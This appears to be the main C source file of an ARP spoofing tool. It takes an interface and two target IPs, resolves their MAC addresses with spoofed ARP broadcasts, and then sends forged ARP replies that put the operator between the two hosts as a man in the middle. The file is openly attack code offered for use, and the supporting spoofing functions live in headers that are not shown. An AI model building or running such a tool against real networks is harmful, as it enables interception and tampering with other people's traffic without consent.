#include "ARP_Headers.h"
#include "ARP_Sniffer.h"
#include "ARP_Packet.h"
#include "ARP_Spoofer.h"
#include "ARP_Log.h"
#include "ARP_Utils.h"

int main(int args, char* argv[])
{
    if(args != 4)
    {
        LOG("Usage: %s <interface> <first-ip> <second-ip>", argv[0]);

        exit(EXIT_FAILURE);
    }

    IP frst_ip;
    IP scnd_ip;
    MAC my_mac;
    MAC frst_mac;
    MAC scnd_mac;
    
    get_my_mac(argv[1], my_mac);
    str_to_ip(argv[2], frst_ip);
    str_to_ip(argv[3], scnd_ip);

    LOG("\n\t\t %s <---> me (%s) <---> %s\n", argv[2], argv[1], argv[3]);

    int sock = init_spoofing(argv[1]);

    broadcast_spoofed_ip(my_mac, frst_ip, scnd_ip,get_interface_sending(argv[1]), sock);
    get_target_mac(sock, scnd_ip, frst_mac);

    broadcast_spoofed_ip(my_mac, scnd_ip, frst_ip, get_interface_sending(argv[1]), sock);
    get_target_mac(sock, frst_ip, scnd_mac);

    send_spoofed_ip(my_mac, frst_ip, frst_ip, scnd_ip, get_interface_sending(argv[1]), sock);
    send_spoofed_ip(my_mac, frst_ip, scnd_ip, frst_ip, get_interface_sending(argv[1]), sock);

    exit(EXIT_SUCCESS);
}